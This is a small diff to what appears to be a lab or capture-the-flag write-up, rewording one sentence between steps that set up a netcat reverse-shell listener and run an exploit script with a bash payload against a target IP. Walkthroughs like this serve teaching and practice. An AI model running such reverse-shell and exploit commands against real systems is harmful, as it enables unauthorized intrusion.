@@ -148,7 +148,7 @@ The next step is to setup the listener for the reverse shell:
 rlwrap nc -lnvp 9001
 ```
 
-We should be all set for the exploit, let's execute:
+And execute:
 
 ```bash
 ./exploit.py -payload bash 10.129.172.93 6697
